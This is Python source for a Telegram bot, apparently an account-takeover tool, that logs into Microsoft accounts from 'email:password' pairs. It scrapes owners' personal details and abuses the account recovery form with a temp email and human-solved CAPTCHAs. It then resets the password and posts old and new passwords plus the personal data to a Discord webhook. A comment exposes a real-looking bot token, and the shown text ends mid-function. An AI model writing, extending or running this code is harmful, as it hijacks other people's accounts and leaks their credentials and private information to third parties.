"""
MS PASSWORD CHANGER — TELEGRAM BOT
Full port from Discord → Telegram
python-telegram-bot v20+ | asyncio | Inline Keyboards | CAPTCHA images
"""

import asyncio
import json
import logging
import os
import random
import sys
import traceback
from datetime import datetime, timedelta
from io import BytesIO
from typing import Optional

from telegram import (
    Bot,
    InlineKeyboardButton,
    InlineKeyboardMarkup,
    InputFile,
    Update,
)
from telegram.constants import ParseMode
from telegram.ext import (
    Application,
    CallbackQueryHandler,
    CommandHandler,
    ContextTypes,
    ConversationHandler,
    MessageHandler,
    filters,
)

# ── Import automation modules ──────────────────────────────────────────────────
sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))

try:
    from automation.core import scrape_account_info
    from automation.acsr import submit_acsr_form
    from automation.acsr_continue import continue_acsr_flow
    from automation.reset_password import perform_password_reset
    from automation.captcha import download_captcha
    import tempmail
except ImportError as e:
    print(f"⚠️  Warning: Could not import automation modules: {e}")
    print("Make sure automation/ and utils/ are in the same directory as bot.py")

# ── Logging ────────────────────────────────────────────────────────────────────
logging.basicConfig(
    format="%(asctime)s | %(levelname)-8s | %(name)s | %(message)s",
    level=logging.INFO,
    handlers=[
        logging.StreamHandler(),
        logging.FileHandler("data/bot.log", encoding="utf-8"),
    ],
)
logger = logging.getLogger("PassChangerBot")

# ── Configuration ──────────────────────────────────────────────────────────────
ADMIN_ID: int = int(os.getenv("ADMIN_TELEGRAM_ID", "0"))  # Set via env or below
BOT_TOKEN: str = os.getenv("BOT_TOKEN", "")                # Set via env or below

# Override here if not using env vars:
# ADMIN_ID  = 8744777152
# BOT_TOKEN = "8563665194:AAFq_IljJtcSaBH72CAIdzY-Pwjbx4JDYWQ"

DATA_DIR                = "data"
CONFIG_FILE             = f"{DATA_DIR}/bot_config.json"
AUTHORIZED_USERS_FILE   = f"{DATA_DIR}/authorized_users.json"
STATS_FILE              = f"{DATA_DIR}/bot_stats.json"
CAPTCHA_DIR             = f"{DATA_DIR}/captchas"

os.makedirs(DATA_DIR,    exist_ok=True)
os.makedirs(CAPTCHA_DIR, exist_ok=True)

# ── ConversationHandler states ─────────────────────────────────────────────────
AWAITING_OTP         = 1
AWAITING_ACCOUNT     = 2
AWAITING_CAPTCHA     = 3
AWAITING_WEBHOOK_URL = 4
AWAITING_AUTH_USER   = 5
AWAITING_REVOKE_USER = 6

# ══════════════════════════════════════════════════════════════════════════════
#  DATA MANAGER
# ══════════════════════════════════════════════════════════════════════════════

class BotDataManager:
    """Centralised state — auth, sessions, OTPs, stats."""

    def __init__(self):
        self.config = self._load(CONFIG_FILE, {
            "webhook_url": "",
            "bot_enabled": True,
            "max_concurrent_users": 10,
        })
        self.authorized_users = self._load(AUTHORIZED_USERS_FILE, {
            str(ADMIN_ID): {
                "authorized": True,
                "added_by":   "system",
                "added_at":   str(datetime.now()),
            }
        })
        self.stats = self._load(STATS_FILE, {
            "total_processed": 0,
            "total_success":   0,
            "total_failed":    0,
            "users_served":    {},
        })

        # In-memory only
        self.active_sessions:     dict = {}   # user_id → auth session
        self.otp_data:            dict = {}   # user_id → {otp, expires, attempts}
        self.processing_sessions: dict = {}   # user_id → processing state

    # ── persistence helpers ────────────────────────────────────────────────────
    def _load(self, path: str, default: dict) -> dict:
        if os.path.exists(path):
            try:
                with open(path, "r", encoding="utf-8") as f:
                    return json.load(f)
            except Exception:
                pass
        return default

    def _save(self, path: str, data: dict) -> None:
        with open(path, "w", encoding="utf-8") as f:
            json.dump(data, f, indent=2, default=str)

    def save_config(self)         -> None: self._save(CONFIG_FILE,           self.config)
    def save_authorized_users(self) -> None: self._save(AUTHORIZED_USERS_FILE, self.authorized_users)
    def save_stats(self)          -> None: self._save(STATS_FILE,             self.stats)

    # ── authorization ──────────────────────────────────────────────────────────
    def is_authorized(self, user_id: int) -> bool:
        return (
            str(user_id) in self.authorized_users
            and self.authorized_users[str(user_id)].get("authorized", False)
        )

    def authorize_user(self, user_id: int, by_admin: int) -> None:
        self.authorized_users[str(user_id)] = {
            "authorized": True,
            "added_by":   str(by_admin),
            "added_at":   str(datetime.now()),
        }
        self.save_authorized_users()

    def revoke_user(self, user_id: int) -> None:
        self.authorized_users.pop(str(user_id), None)
        self.save_authorized_users()

    # ── OTP ───────────────────────────────────────────────────────────────────
    def generate_otp(self, user_id: int) -> str:
        otp = "".join(str(random.randint(0, 9)) for _ in range(6))
        self.otp_data[user_id] = {
            "otp":      otp,
            "expires":  datetime.now() + timedelta(minutes=5),
            "attempts": 0,
        }
        return otp

    def verify_otp(self, user_id: int, otp: str) -> tuple[bool, str]:
        if user_id not in self.otp_data:
            return False, "❌ No OTP requested. Use /request_otp first."
        rec = self.otp_data[user_id]
        if datetime.now() > rec["expires"]:
            del self.otp_data[user_id]
            return False, "❌ OTP expired. Request a new one with /request_otp."
        if rec["attempts"] >= 3:
            del self.otp_data[user_id]
            return False, "❌ Maximum OTP attempts exceeded. Request a new one."
        if rec["otp"] == otp.strip():
            del self.otp_data[user_id]
            self.active_sessions[user_id] = {
                "authenticated": True,
                "auth_time":     datetime.now(),
            }
            return True, "✅ Authentication successful!"
        rec["attempts"] += 1
        remaining = 3 - rec["attempts"]
        return False, f"❌ Invalid OTP. {remaining} attempt(s) remaining."

    # ── session ───────────────────────────────────────────────────────────────
    def is_authenticated(self, user_id: int) -> bool:
        if user_id not in self.active_sessions:
            return False
        auth_time = self.active_sessions[user_id].get("auth_time")
        if isinstance(auth_time, str):
            auth_time = datetime.fromisoformat(auth_time)
        if datetime.now() - auth_time > timedelta(hours=24):
            del self.active_sessions[user_id]
            return False
        return True

    def logout(self, user_id: int) -> None:
        self.active_sessions.pop(user_id, None)

    # ── stats ─────────────────────────────────────────────────────────────────
    def update_stats(self, user_id: int, success: bool) -> None:
        self.stats["total_processed"] += 1
        if success:
            self.stats["total_success"] += 1
        else:
            self.stats["total_failed"] += 1
        uid = str(user_id)
        self.stats["users_served"].setdefault(uid, {"processed": 0, "success": 0})
        self.stats["users_served"][uid]["processed"] += 1
        if success:
            self.stats["users_served"][uid]["success"] += 1
        self.save_stats()


dm = BotDataManager()


# ══════════════════════════════════════════════════════════════════════════════
#  HELPERS
# ══════════════════════════════════════════════════════════════════════════════

def generate_elite_password() -> str:
    return f"EliteCloud{''.join(str(random.randint(0,9)) for _ in range(6))}"


def md(text: str) -> str:
    """Escape MarkdownV2 special chars."""
    escape = r"\_*[]()~`>#+-=|{}.!"
    return "".join(f"\\{c}" if c in escape else c for c in text)


def auth_check(func):
    """Decorator — must be authorized."""
    async def wrapper(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
        user_id = update.effective_user.id
        if not dm.is_authorized(user_id):
            await update.effective_message.reply_text(
                f"🚫 *Not authorized*\nContact the admin to get access\\.",
                parse_mode=ParseMode.MARKDOWN_V2,
            )
            return ConversationHandler.END
        return await func(update, ctx)
    wrapper.__name__ = func.__name__
    return wrapper


def login_check(func):
    """Decorator — must be authenticated."""
    async def wrapper(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
        user_id = update.effective_user.id
        if not dm.is_authenticated(user_id):
            await update.effective_message.reply_text(
                "🔐 *Not logged in*\nUse /request\\_otp then /verify\\_otp to authenticate\\.",
                parse_mode=ParseMode.MARKDOWN_V2,
            )
            return ConversationHandler.END
        return await func(update, ctx)
    wrapper.__name__ = func.__name__
    return wrapper


def admin_only(func):
    """Decorator — admin only."""
    async def wrapper(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
        if update.effective_user.id != ADMIN_ID:
            await update.effective_message.reply_text("🚫 Admin only command.")
            return ConversationHandler.END
        return await func(update, ctx)
    wrapper.__name__ = func.__name__
    return wrapper


# ══════════════════════════════════════════════════════════════════════════════
#  INLINE KEYBOARD BUILDERS
# ══════════════════════════════════════════════════════════════════════════════

def kb_main_menu() -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("🔐 Request OTP",   callback_data="req_otp"),
         InlineKeyboardButton("✅ Verify OTP",    callback_data="go_verify")],
        [InlineKeyboardButton("⚙️ Process Account", callback_data="go_process"),
         InlineKeyboardButton("📊 Status",         callback_data="go_status")],
        [InlineKeyboardButton("🚪 Logout",         callback_data="go_logout"),
         InlineKeyboardButton("❌ Cancel",          callback_data="go_cancel")],
    ])

def kb_admin_panel() -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("➕ Authorize User",  callback_data="adm_authorize"),
         InlineKeyboardButton("➖ Revoke User",     callback_data="adm_revoke")],
        [InlineKeyboardButton("👥 List Users",      callback_data="adm_listusers"),
         InlineKeyboardButton("📊 Stats",           callback_data="adm_stats")],
        [InlineKeyboardButton("🔗 Set Webhook",     callback_data="adm_webhook"),
         InlineKeyboardButton("✖️ Close",           callback_data="adm_close")],
    ])

def kb_confirm_cancel() -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("✅ Yes, cancel", callback_data="confirm_cancel"),
         InlineKeyboardButton("🔙 No, go back", callback_data="back_main")],
    ])


# ══════════════════════════════════════════════════════════════════════════════
#  WEBHOOK NOTIFIER
# ══════════════════════════════════════════════════════════════════════════════

async def send_to_webhook(result: dict) -> None:
    webhook_url = dm.config.get("webhook_url", "")
    if not webhook_url:
        return
    import aiohttp
    payload = {
        "embeds": [{
            "title":  "✅ Password Changed Successfully",
            "color":  0x10B981,
            "fields": [
                {"name": "📧 Email",          "value": f"`{result['email']}`",        "inline": False},
                {"name": "🔓 Old Password",   "value": f"`{result['old_password']}`", "inline": True},
                {"name": "🔒 New Password",   "value": f"`{result['new_password']}`", "inline": True},
                {"name": "👤 Name",           "value": result.get("name", "N/A"),     "inline": True},
                {"name": "🎂 DOB",            "value": result.get("dob",  "N/A"),     "inline": True},
                {"name": "🌍 Region",         "value": result.get("region","N/A"),    "inline": True},
                {"name": "💬 Skype ID",       "value": result.get("skype_id","N/A"),  "inline": True},
                {"name": "📧 Skype Email",    "value": result.get("skype_email","N/A"), "inline": True},
                {"name": "🎮 Xbox Gamertag",  "value": result.get("gamertag","N/A"),  "inline": True},
            ],
            "footer":    {"text": f"Processed by Telegram UID: {result.get('user_id','?')}"},
            "timestamp": datetime.utcnow().isoformat(),
        }]
    }
    try:
        async with aiohttp.ClientSession() as sess:
            async with sess.post(webhook_url, json=payload) as resp:
                logger.info(f"Webhook → {resp.status}")
    except Exception as exc:
        logger.error(f"Webhook error: {exc}")


# ══════════════════════════════════════════════════════════════════════════════
#  ACCOUNT PROCESSING PIPELINE
# ══════════════════════════════════════════════════════════════════════════════

async def process_account_full(
    email: str,
    password: str,
    user_id: int,
    chat_id: int,
    bot: Bot,
) -> dict:
    """
    Steps 1–3: login → scrape → ACSR form → deliver CAPTCHA image.
    Pauses and waits for /submit_captcha to continue.
    """
    loop = asyncio.get_event_loop()

    async def send(text: str, **kw):
        await bot.send_message(chat_id=chat_id, text=text,
                               parse_mode=ParseMode.MARKDOWN_V2, **kw)

    try:
        await send(
            "🔍 *Step 1/5 — Scraping account info*\n"
            f"Logging into `{md(email)}`\\.\\.\\."
        )
        logger.info(f"[{user_id}] Processing: {email}")

        account_info = await loop.run_in_executor(
            None, scrape_account_info, email, password
        )

        if not account_info or account_info.get("error"):
            err = account_info.get("error", "Could not login") if account_info else "Could not login"
            await send(f"❌ *Login Failed*\n`{md(err)}`")
            dm.update_stats(user_id, False)
            return {"status": "failed", "error": err}

        name = account_info.get("name", "Unknown")
        await send(
            f"📝 *Step 2/5 — Submitting ACSR form*\n"
            f"✅ Scraped: *{md(name)}*\n"
            "Generating temp email & submitting recovery form\\.\\.\\."
        )

        captcha_image, driver, token, temp_email = await loop.run_in_executor(
            None, submit_acsr_form, account_info
        )

        if not captcha_image or not driver:
            await send("❌ *ACSR Submission Failed*\nCould not submit the recovery form\\.")
            dm.update_stats(user_id, False)
            return {"status": "failed", "error": "ACSR submission failed"}

        logger.info(f"[{user_id}] ACSR submitted, temp_email={temp_email}")

        # Save CAPTCHA to disk
        ts              = int(datetime.now().timestamp())
        captcha_path    = f"{CAPTCHA_DIR}/captcha_{user_id}_{ts}.png"
        captcha_image.seek(0)
        with open(captcha_path, "wb") as fh:
            fh.write(captcha_image.read())

        # Persist processing session
        dm.processing_sessions[user_id] = {
            "driver":           driver,
            "token":            token,
            "temp_email":       temp_email,
            "account_info":     account_info,
            "email":            email,
            "password":         password,
            "captcha_path":     captcha_path,
            "captcha_attempts": 0,
            "chat_id":          chat_id,
            "start_time":       datetime.now(),
        }

        # Send CAPTCHA image with instructions
        await send(
            "🖼️ *Step 3/5 — CAPTCHA Required*\n\n"
            "Solve the image below, then send:\n"
            "`/submit\\_captcha YOUR\\_ANSWER`\n\n"
            "⏱ Timeout: 5 minutes \\| 🔄 Max attempts: 3"
        )
        with open(captcha_path, "rb") as img_fh:
            await bot.send_photo(chat_id=chat_id, photo=InputFile(img_fh))

        return {"status": "captcha_pending"}

    except Exception as exc:
        logger.error(f"[{user_id}] process_account_full error: {exc}")
        traceback.print_exc()
        await send(f"❌ *Processing Error*\n`{md(str(exc))}`")
        dm.update_stats(user_id, False)
        return {"status": "failed", "error": str(exc)}


async def continue_after_captcha(
    user_id: int,
    captcha_text: str,
    update: Update,
    context: ContextTypes.DEFAULT_TYPE,
) -> None:
    """Steps 4–5: continue ACSR flow → password reset."""
    if user_id not in dm.processing_sessions:
        await update.message.reply_text("❌ No active CAPTCHA session found\\. Use /process to start\\.",
                                        parse_mode=ParseMode.MARKDOWN_V2)
        return

    sess        = dm.processing_sessions[user_id]
    driver      = sess["driver"]
    token       = sess["token"]
    account_info= sess["account_info"]
    email       = sess["email"]
    password    = sess["password"]
    chat_id     = sess["chat_id"]
    bot         = context.bot
    loop        = asyncio.get_event_loop()

    async def send(text: str, **kw):
        await bot.send_message(chat_id=chat_id, text=text,
                               parse_mode=ParseMode.MARKDOWN_V2, **kw)

    try:
        await send(
            "⚙️ *Step 4/5 — Continuing ACSR flow*\n"
            "Submitting CAPTCHA and waiting for OTP from temp email\\.\\.\\."
        )
        logger.info(f"[{user_id}] Submitting CAPTCHA: {captcha_text}")

        reset_link = await loop.run_in_executor(
            None, continue_acsr_flow, driver, account_info, token, captcha_text, user_id
        )

        # ── CAPTCHA retry ──────────────────────────────────────────────────
        if reset_link == "CAPTCHA_RETRY_NEEDED":
            sess["captcha_attempts"] += 1
            if sess["captcha_attempts"] >= 3:
                await send(
                    "❌ *Max CAPTCHA attempts reached*\n"
                    "Use /process to start a new session\\."
                )
                _cleanup_session(user_id)
                dm.update_stats(user_id, False)
                return

            logger.info(f"[{user_id}] CAPTCHA wrong — fetching new one")
            new_captcha = await loop.run_in_executor(None, download_captcha, driver)
            ts          = int(datetime.now().timestamp())
            new_path    = f"{CAPTCHA_DIR}/captcha_{user_id}_{ts}.png"
            new_captcha.seek(0)
            with open(new_path, "wb") as fh:
                fh.write(new_captcha.read())

            _remove_file(sess.get("captcha_path"))
            sess["captcha_path"] = new_path

            remaining = 3 - sess["captcha_attempts"]
            await send(
                f"❌ *Wrong CAPTCHA*\nAttempts remaining: *{remaining}*\n"
                "Try again with `/submit\\_captcha YOUR\\_ANSWER`"
            )
            with open(new_path, "rb") as img:
                await bot.send_photo(chat_id=chat_id, photo=InputFile(img))
            return

        # ── ACSR hard failure ──────────────────────────────────────────────
        if not reset_link or str(reset_link).startswith("ERROR") or str(reset_link).startswith("❌"):
            await send(f"❌ *ACSR Failed*\n`{md(str(reset_link))}`")
            _cleanup_session(user_id)
            dm.update_stats(user_id, False)
            return

        logger.info(f"[{user_id}] Reset link received")

        # ── Step 5: reset password ─────────────────────────────────────────
        await send(
            "🔒 *Step 5/5 — Resetting password*\n"
            "Opening reset link and changing to *EliteCloud* format\\.\\.\\."
        )

        new_password = generate_elite_password()
        logger.info(f"[{user_id}] New password: {new_password}")

        actual_password = await loop.run_in_executor(
            None, perform_password_reset, reset_link, email, new_password
        )

        if not actual_password:
            await send("❌ *Password Reset Failed*\nPlease try again with /process\\.")
            _cleanup_session(user_id)
            dm.update_stats(user_id, False)
            return

        logger.info(f"[{user_id}] Password changed → {actual_password}")

        result = {
            "email":        email,
            "old_password": password,
            "new_password": actual_password,
            "name":         account_info.get("name"),
            "dob":          account_info.get("dob"),
            "region":       account_info.get("region"),
            "skype_id":     account_info.get("skype_id"),
            "skype_email":  account_info.get("skype_email"),
            "gamertag":     account_info.get("gamertag"),
            "user_id":      user_id,
        }

        await send_to_webhook(result)
        dm.update_stats(user_id, True)

        await send(
            "✅ *SUCCESS — Password Changed\\!*\n\n"
            f"📧 Account: `{md(email)}`\n"
            f"🔓 Old: `{md(password)}`\n"
            f"🔒 New: `{md(actual_password)}`\n\n"
            "📊 Full details sent to webhook\\!"
        )

        _cleanup_session(user_id)

    except Exception as exc:
        logger.error(f"[{user_id}] continue_after_captcha error: {exc}")
        traceback.print_exc()
        await send(f"❌ *Error*\n`{md(str(exc))}`")
        _cleanup_session(user_id)
        dm.update_stats(user_id, False)


def _cleanup_session(user_id: int) -> None:
    sess = dm.processing_sessions.pop(user_id, {})
    _remove_file(sess.get("captcha_path"))
    try:
        sess.get("driver") and sess["driver"].quit()
    except Exception:
        pass


def _remove_file(path: Optional[str]) -> None:
    if path and os.path.exists(path):
        try:
            os.remove(path)
        except Exception:
            pass


# ══════════════════════════════════════════════════════════════════════════════
#  COMMAND HANDLERS
# ══════════════════════════════════════════════════════════════════════════════

async def cmd_start(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
    user = update.effective_user
    if not dm.is_authorized(user.id):
        await update.message.reply_text(
            "🚫 *Access Denied*\nYou are not authorized\\. Contact the admin\\.",
            parse_mode=ParseMode.MARKDOWN_V2,
        )
        return
    await update.message.reply_text(
        f"👋 *Welcome, {md(user.first_name)}\\!*\n\n"
        "MS Password Changer Bot — Telegram Edition\n\n"
        "Use /help to see all commands\\.",
        parse_mode=ParseMode.MARKDOWN_V2,
        reply_markup=kb_main_menu(),
    )


async def cmd_help(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
    user_id = update.effective_user.id
    if not dm.is_authorized(user_id):
        await update.message.reply_text("🚫 Not authorized\\.", parse_mode=ParseMode.MARKDOWN_V2)
        return

    admin_section = ""
    if user_id == ADMIN_ID:
        admin_section = (
            "\n\n🛡️ *Admin Commands*\n"
            "/admin — Admin panel\n"
            "/authorize — Grant user access\n"
            "/revoke — Remove user access\n"
            "/list\\_users — View authorized users\n"
            "/set\\_webhook — Configure webhook URL\n"
            "/stats — View detailed statistics"
        )

    await update.message.reply_text(
        "📚 *MS Password Changer Bot*\n"
        "_Full ACSR Automation — Telegram Edition_\n\n"
        "🔐 *Authentication*\n"
        "/request\\_otp — Get 6\\-digit code via DM\n"
        "/verify\\_otp `<code>` — Login with OTP\n"
        "/logout — End session\n\n"
        "🔧 *Processing*\n"
        "/process `email:password` — Start processing\n"
        "/submit\\_captcha `<text>` — Solve CAPTCHA\n"
        "/status — Check session status\n"
        "/cancel — Cancel current process\n"
        f"{admin_section}\n\n"
        "📖 *Quick Start*\n"
        "1️⃣ /request\\_otp → get code in DM\n"
        "2️⃣ /verify\\_otp `<code>` → authenticate\n"
        "3️⃣ /process `email:pass` → start ACSR\n"
        "4️⃣ Bot sends CAPTCHA image\n"
        "5️⃣ /submit\\_captcha `<text>` → continue\n"
        "6️⃣ ✅ Password changed automatically\\!",
        parse_mode=ParseMode.MARKDOWN_V2,
    )


# ── OTP flow ───────────────────────────────────────────────────────────────────

@auth_check
async def cmd_request_otp(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
    user_id = update.effective_user.id
    if dm.is_authenticated(user_id):
        await update.message.reply_text(
            "ℹ️ You are already logged in\\. Use /logout first if you want to re\\-authenticate\\.",
            parse_mode=ParseMode.MARKDOWN_V2,
        )
        return

    otp = dm.generate_otp(user_id)

    try:
        await ctx.bot.send_message(
            chat_id=user_id,
            text=(
                "🔐 *Your One\\-Time Password*\n\n"
                f"Code: `{otp}`\n\n"
                "⏱ Expires in *5 minutes*\\.\n"
                "Use `/verify_otp " + otp + "` in the bot chat\\."
            ),
            parse_mode=ParseMode.MARKDOWN_V2,
        )
        await update.message.reply_text(
            "✅ OTP sent\\! Check your Telegram DM from this bot\\.",
            parse_mode=ParseMode.MARKDOWN_V2,
        )
    except Exception:
        # Fallback: send directly in chat (private)
        await update.message.reply_text(
            f"🔐 *Your OTP:* `{otp}`\n⏱ Expires in 5 minutes\\.",
            parse_mode=ParseMode.MARKDOWN_V2,
        )


@auth_check
async def cmd_verify_otp(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
    if not ctx.args:
        await update.message.reply_text(
            "❌ Usage: `/verify_otp <6-digit code>`",
            parse_mode=ParseMode.MARKDOWN_V2,
        )
        return
    user_id = update.effective_user.id
    code    = ctx.args[0].strip()
    ok, msg = dm.verify_otp(user_id, code)
    await update.message.reply_text(
        md(msg),
        parse_mode=ParseMode.MARKDOWN_V2,
        reply_markup=kb_main_menu() if ok else None,
    )


@login_check
async def cmd_logout(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
    dm.logout(update.effective_user.id)
    await update.message.reply_text(
        "👋 *Logged out*\\. Use /request\\_otp to authenticate again\\.",
        parse_mode=ParseMode.MARKDOWN_V2,
    )


# ── Process ────────────────────────────────────────────────────────────────────

@login_check
async def cmd_process(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
    user_id = update.effective_user.id

    if not ctx.args:
        await update.message.reply_text(
            "❌ Usage: `/process email:password`",
            parse_mode=ParseMode.MARKDOWN_V2,
        )
        return

    account = " ".join(ctx.args).strip()
    if ":" not in account:
        await update.message.reply_text(
            "❌ Invalid format\\. Use: `/process email:password`",
            parse_mode=ParseMode.MARKDOWN_V2,
        )
        return

    if user_id in dm.processing_sessions:
        await update.message.reply_text(
            "⚠️ You already have an active session\\.\n"
            "Use /submit\\_captcha to continue or /cancel to abort\\.",
            parse_mode=ParseMode.MARKDOWN_V2,
        )
        return

    email, password = account.split(":", 1)
    email    = email.strip()
    password = password.strip()

    await update.message.reply_text(
        f"🚀 *Starting process*\n"
        f"Target: `{md(email)}`\n\nUpdates will appear below\\.",
        parse_mode=ParseMode.MARKDOWN_V2,
    )

    asyncio.create_task(
        process_account_full(email, password, user_id, update.effective_chat.id, ctx.bot)
    )


@login_check
async def cmd_submit_captcha(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
    user_id = update.effective_user.id

    if user_id not in dm.processing_sessions:
        await update.message.reply_text(
            "❌ No active CAPTCHA session\\. Use /process to start\\.",
            parse_mode=ParseMode.MARKDOWN_V2,
        )
        return

    if not ctx.args:
        await update.message.reply_text(
            "❌ Usage: `/submit_captcha <captcha text>`",
            parse_mode=ParseMode.MARKDOWN_V2,
        )
        return

    captcha_text = " ".join(ctx.args).strip()
    asyncio.create_task(continue_after_captcha(user_id, captcha_text, update, ctx))


@login_check
async def cmd_status(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
    user_id = update.effective_user.id
    lines   = ["✅ *Session Status*\n", "🔒 Auth: Logged in"]

    if user_id in dm.processing_sessions:
        sess = dm.processing_sessions[user_id]
        lines += [
            "⏳ Process: CAPTCHA pending",
            f"📧 Target: `{md(sess['email'])}`",
            f"🔄 CAPTCHA attempts: {sess['captcha_attempts']}/3",
        ]
    else:
        lines.append("⚙️ Process: None active")

    await update.message.reply_text(
        "\n".join(lines),
        parse_mode=ParseMode.MARKDOWN_V2,
    )


@login_check
async def cmd_cancel(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
    user_id = update.effective_user.id
    if user_id not in dm.processing_sessions:
        await update.message.reply_text(
            "ℹ️ No active process to cancel\\.",
            parse_mode=ParseMode.MARKDOWN_V2,
        )
        return
    await update.message.reply_text(
        "⚠️ *Are you sure you want to cancel?*",
        parse_mode=ParseMode.MARKDOWN_V2,
        reply_markup=kb_confirm_cancel(),
    )


# ══════════════════════════════════════════════════════════════════════════════
#  ADMIN COMMANDS
# ══════════════════════════════════════════════════════════════════════════════

@admin_only
async def cmd_admin(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
    s = dm.stats
    rate = (s["total_success"] / s["total_processed"] * 100) if s["total_processed"] else 0
    await update.message.reply_text(
        "🛡️ *Admin Control Panel*\n\n"
        f"👥 Authorized users: `{len(dm.authorized_users)}`\n"
        f"🔓 Active sessions: `{len(dm.active_sessions)}`\n"
        f"⚙️ Active processes: `{len(dm.processing_sessions)}`\n"
        f"📈 Processed: `{s['total_processed']}` \\| "
        f"✅ `{s['total_success']}` \\| ❌ `{s['total_failed']}`\n"
        f"🎯 Success rate: `{rate:.1f}%`\n"
        f"🔗 Webhook: `{'Set' if dm.config.get('webhook_url') else 'Not set'}`",
        parse_mode=ParseMode.MARKDOWN_V2,
        reply_markup=kb_admin_panel(),
    )


@admin_only
async def cmd_authorize(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
    if not ctx.args:
        await update.message.reply_text("Usage: /authorize <telegram_user_id>")
        return
    try:
        target_id = int(ctx.args[0])
    except ValueError:
        await update.message.reply_text("❌ Invalid user ID\\.", parse_mode=ParseMode.MARKDOWN_V2)
        return
    if dm.is_authorized(target_id):
        await update.message.reply_text(f"ℹ️ User `{target_id}` is already authorized\\.",
                                        parse_mode=ParseMode.MARKDOWN_V2)
        return
    dm.authorize_user(target_id, update.effective_user.id)
    await update.message.reply_text(
        f"✅ User `{target_id}` authorized\\!",
        parse_mode=ParseMode.MARKDOWN_V2,
    )
    try:
        await ctx.bot.send_message(
            chat_id=target_id,
            text="🎉 *You have been authorized\\!*\nUse /start to begin\\.",
            parse_mode=ParseMode.MARKDOWN_V2,
        )
    except Exception:
        pass


@admin_only
async def cmd_revoke(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
    if not ctx.args:
        await update.message.reply_text("Usage: /revoke <telegram_user_id>")
        return
    try:
        target_id = int(ctx.args[0])
    except ValueError:
        await update.message.reply_text("❌ Invalid user ID\\.", parse_mode=ParseMode.MARKDOWN_V2)
        return
    if target_id == ADMIN_ID:
        await update.message.reply_text("❌ Cannot revoke the admin\\.", parse_mode=ParseMode.MARKDOWN_V2)
        return
    dm.revoke_user(target_id)
    await update.message.reply_text(
        f"✅ Access revoked for `{target_id}`\\.",
        parse_mode=ParseMode.MARKDOWN_V2,
    )


@admin_only
async def cmd_list_users(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
    if not dm.authorized_users:
        await update.message.reply_text("No authorized users\\.", parse_mode=ParseMode.MARKDOWN_V2)
        return
    lines = ["👥 *Authorized Users*\n"]
    for uid, info in dm.authorized_users.items():
        added = info.get("added_at", "?")[:10]
        lines.append(f"• `{uid}` — added {md(added)}")
    await update.message.reply_text(
        "\n".join(lines),
        parse_mode=ParseMode.MARKDOWN_V2,
    )


@admin_only
async def cmd_set_webhook(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
    if not ctx.args:
        await update.message.reply_text("Usage: /set_webhook <discord_webhook_url>")
        return
    url = ctx.args[0].strip()
    if not url.startswith("https://discord.com/api/webhooks/"):
        await update.message.reply_text("❌ Invalid Discord webhook URL\\.", parse_mode=ParseMode.MARKDOWN_V2)
        return
    dm.config["webhook_url"] = url
    dm.save_config()
    await update.message.reply_text("✅ Webhook URL configured\\!", parse_mode=ParseMode.MARKDOWN_V2)


@admin_only
async def cmd_stats(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
    s    = dm.stats
    rate = (s["total_success"] / s["total_processed"] * 100) if s["total_processed"] else 0

    top = sorted(
        s["users_served"].items(),
        key=lambda x: x[1]["processed"],
        reverse=True,
    )[:5]
    top_lines = "\n".join(
        f"  `{uid}` — {d['processed']} processed, {d['success']} success"
        for uid, d in top
    ) or "  No data yet"

    await update.message.reply_text(
        "📊 *Detailed Statistics*\n\n"
        f"📈 Total processed: `{s['total_processed']}`\n"
        f"✅ Success: `{s['total_success']}`\n"
        f"❌ Failed: `{s['total_failed']}`\n"
        f"🎯 Success rate: `{rate:.1f}%`\n"
        f"👥 Authorized users: `{len(dm.authorized_users)}`\n\n"
        f"🏆 *Top Users:*\n{top_lines}",
        parse_mode=ParseMode.MARKDOWN_V2,
    )


# ══════════════════════════════════════════════════════════════════════════════
#  CALLBACK QUERY (INLINE KEYBOARD) HANDLER
# ══════════════════════════════════════════════════════════════════════════════

async def handle_callback(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
    query   = update.callback_query
    user_id = query.from_user.id
    data    = query.data
    await query.answer()

    # ── Main menu callbacks ────────────────────────────────────────────────
    if data == "req_otp":
        ctx.args = []
        await cmd_request_otp(update, ctx)

    elif data == "go_verify":
        await query.message.reply_text(
            "Reply with: `/verify_otp <code>`",
            parse_mode=ParseMode.MARKDOWN_V2,
        )

    elif data == "go_process":
        if not dm.is_authenticated(user_id):
            await query.message.reply_text("🔐 Login first with /request\\_otp",
                                           parse_mode=ParseMode.MARKDOWN_V2)
            return
        await query.message.reply_text(
            "Send: `/process email:password`",
            parse_mode=ParseMode.MARKDOWN_V2,
        )

    elif data == "go_status":
        ctx.args = []
        await cmd_status(update, ctx)

    elif data == "go_logout":
        dm.logout(user_id)
        await query.message.reply_text("👋 Logged out\\.", parse_mode=ParseMode.MARKDOWN_V2)

    elif data == "go_cancel":
        if user_id not in dm.processing_sessions:
            await query.message.reply_text("ℹ️ Nothing to cancel\\.", parse_mode=ParseMode.MARKDOWN_V2)
            return
        await query.message.reply_text(
            "⚠️ *Cancel active process?*",
            parse_mode=ParseMode.MARKDOWN_V2,
            reply_markup=kb_confirm_cancel(),
        )

    elif data == "confirm_cancel":
        _cleanup_session(user_id)
